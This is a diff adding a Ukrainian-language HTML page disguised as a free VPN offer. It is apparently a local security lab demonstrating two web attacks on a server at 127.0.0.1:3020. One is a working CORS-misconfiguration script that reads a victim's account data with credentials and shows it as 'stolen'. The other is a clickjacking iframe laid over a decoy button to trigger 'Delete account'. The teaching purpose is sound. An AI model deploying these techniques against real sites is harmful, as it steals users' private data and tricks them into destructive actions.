@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="uk">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Безкоштовний VPN</title>
+    <style>
+        body { font-family: system-ui, sans-serif; background: #f4f6fb; color: #222; margin: 0; padding: 24px 16px; }
+        .wrap { max-width: 900px; margin: 0 auto; }
+        .card { background: #fff; border-radius: 12px; padding: 18px; margin-bottom: 18px; box-shadow: 0 4px 18px rgba(0,0,0,.08); }
+        pre { background: #111; color: #7CFC9A; padding: 10px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; }
+        .stage { position: relative; width: 100%; max-width: 760px; height: 520px; border: 2px dashed #aaa; border-radius: 10px; overflow: hidden; background: #fff; }
+        .decoy { position: absolute; left: 0; right: 0; text-align: center; font-size: 1.4rem; z-index: 1; }
+        .decoy button { font-size: 1.3rem; padding: 14px 28px; background: #2e7d32; color: #fff; border: 0; border-radius: 10px; }
+        iframe { position: absolute; inset: 0; width: 100%; height: 100%; border: 0; z-index: 2; }
+        label { user-select: none; }
+    </style>
+</head>
+<body>
+<div class="wrap">
+    <h1>🌐 Безкоштовний VPN — 0 грн назавжди!</h1>
+
+    <div class="card">
+        <h2>Атака 1 · CORS misconfiguration</h2>
+        <p>Скрипт на цій сторінці робить <code>fetch('http://127.0.0.1:3020/api/account', {credentials: 'include'})</code>.
+            Сервер віддзеркалює наш Origin та дозволяє credentials → ми читаємо приватні дані жертви.</p>
+        <pre id="cors">⏳ …</pre>
+    </div>
+
+    <div class="card">
+        <h2>Атака 2 · Clickjacking</h2>
+        <p>Адмінка завантажена у прозорий <code>&lt;iframe&gt;</code> поверх кнопки «Отримати VPN».
+            Жертва думає, що натискає нашу кнопку, а насправді — «Видалити акаунт».</p>
+        <label><input type="range" id="op" min="0" max="100" value="0"> прозорість iframe: <span id="opv">0</span>%</label>
+        <label style="margin-left:16px"><input type="number" id="top" value="300" style="width:70px"> зсув кнопки, px</label>
+        <div class="stage" style="margin-top:10px">
+            <div class="decoy" id="decoy" style="top:300px"><button>🎁 Отримати VPN</button></div>
+            <iframe id="frame" src="http://127.0.0.1:3020/" style="opacity:0"></iframe>
+        </div>
+        <p style="font-size:.9rem;color:#666">Підбери зсув так, щоб «🗑 Видалити акаунт» в iframe опинився рівно над зеленою кнопкою (підніми прозорість, щоб побачити). У режимі <code>--secure</code> iframe не завантажиться (X-Frame-Options / frame-ancestors).</p>
+    </div>
+</div>
+<script>
+    fetch('http://127.0.0.1:3020/api/account', { credentials: 'include' })
+        .then(r => r.json())
+        .then(d => {
+            document.getElementById('cors').textContent = '🔴 ВКРАДЕНО:\n' + JSON.stringify(d, null, 2);
+            console.log('[ATTACKER] stolen', d);
+        })
+        .catch(e => {
+            document.getElementById('cors').textContent = '🟢 Браузер заблокував читання відповіді (CORS): ' + e.message +
+                '\n(або ти не увійшов в адмінку на 127.0.0.1:3020)';
+        });
+
+    const frame = document.getElementById('frame');
+    document.getElementById('op').oninput = e => {
+        frame.style.opacity = e.target.value / 100;
+        document.getElementById('opv').textContent = e.target.value;
+    };
+    document.getElementById('top').oninput = e => {
+        document.getElementById('decoy').style.top = e.target.value + 'px';
+    };
+</script>
+</body>
+</html>
